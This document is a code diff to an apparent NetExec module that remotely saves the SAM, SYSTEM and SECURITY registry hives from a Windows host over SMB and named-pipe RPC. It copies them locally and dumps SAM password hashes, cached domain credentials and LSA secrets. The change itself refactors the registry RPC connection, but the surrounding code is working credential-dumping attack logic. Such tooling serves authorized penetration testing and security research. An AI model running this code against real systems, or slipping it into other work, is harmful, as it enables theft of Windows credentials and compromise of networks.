@@ -29,13 +29,15 @@ class NXCModule:
     def on_login(self, context, connection):
         connection.args.share = "SYSVOL"
         # enable remote registry
-        remote_ops = RemoteOperations(connection.conn)
         context.log.display("Triggering start through named pipe...")
         self.trigger_winreg(connection.conn, context)
-        remote_ops.connect_winreg()
+        rpc = transport.DCERPCTransportFactory(r"ncacn_np:445[\pipe\winreg]")
+        rpc.set_smb_connection(connection.conn)
+        dce = rpc.get_dce_rpc()
+        dce.connect()
+        dce.bind(rrp.MSRPC_UUID_RRP)
 
         try:
-            dce = remote_ops.get_rrp()
             for hive in ["HKLM\\SAM", "HKLM\\SYSTEM", "HKLM\\SECURITY"]:
                 hRootKey, subKey = self._strip_root_key(dce, hive)
                 outputFileName = f"\\\\{connection.host}\\SYSVOL\\{subKey}"
@@ -50,8 +52,7 @@ class NXCModule:
         except (Exception, KeyboardInterrupt) as e:
             context.log.fail(str(e))
         finally:
-            if remote_ops:
-                remote_ops.finish()
+            dce.disconnect()
 
         # copy remote file to local
         log_path = os.path.expanduser(f"{NXC_PATH}/logs/{connection.hostname}_{connection.host}_{datetime.datetime.now().strftime('%Y-%m-%d_%H%M%S')}.".replace(":", "-"))
@@ -74,7 +75,7 @@ class NXCModule:
             sam_hashes.dump()
             sam_hashes.finish()
 
-            LSA = LSASecrets(log_path + "SECURITY", bootKey, remote_ops, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
+            LSA = LSASecrets(log_path + "SECURITY", bootKey, None, isRemote=False, perSecretCallback=lambda secret_type, secret: context.log.highlight(secret))
             LSA.dumpCachedHashes()
             LSA.dumpSecrets()
         except Exception as e:
@@ -124,23 +125,3 @@ class NXCModule:
         ans = rrp.hOpenLocalMachine(dce)
         h_root_key = ans["phKey"]
         return h_root_key, sub_key
-
-class RemoteOperations:
-    def __init__(self, smb_connection):
-        self._smb_connection = smb_connection
-        self._string_binding_winreg = r"ncacn_np:445[\pipe\winreg]"
-        self._rrp = None
-
-    def get_rrp(self):
-        return self._rrp
-
-    def connect_winreg(self):
-        rpc = transport.DCERPCTransportFactory(self._string_binding_winreg)
-        rpc.set_smb_connection(self._smb_connection)
-        self._rrp = rpc.get_dce_rpc()
-        self._rrp.connect()
-        self._rrp.bind(rrp.MSRPC_UUID_RRP)
-
-    def finish(self):
-        if self._rrp is not None:
-            self._rrp.disconnect()
